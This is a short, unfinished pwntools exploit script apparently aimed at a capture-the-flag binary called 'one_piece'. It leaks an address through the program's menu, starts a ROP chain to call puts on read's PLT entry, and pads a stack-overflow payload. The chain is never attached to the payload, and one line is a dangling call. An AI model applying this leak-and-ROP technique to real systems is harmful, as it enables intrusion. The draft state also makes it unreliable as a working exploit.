#!/usr/bin/python3
from pwn import *
import re

context.arch = 'amd64'
context.terminal = ['termite', '-e']
p = process(["./one_piece"])

# call puts
p.sendafter(b'(menu)>>', b'\n')
# call read
p.sendafter(b'(menu)>>', b'read\n')
p.sendafter(b'>>', b'read\n')

p.sendafter(b'(menu)>>', b'gomugomunomi\n')
resp = p.recvuntil(b'\n')
buf_addr = int(re.search(b'[0-9a-f]{4,}', resp)[0], 16)


binary = ELF('one_piece')
binary.address = buf_addr
chain = ROP(binary)
chain.call('puts', (p64(chain.resolve('plt.read')),))
chain.call
payload = b'A'*0x40
payload += b'B'*8
# payload += chain.chain()
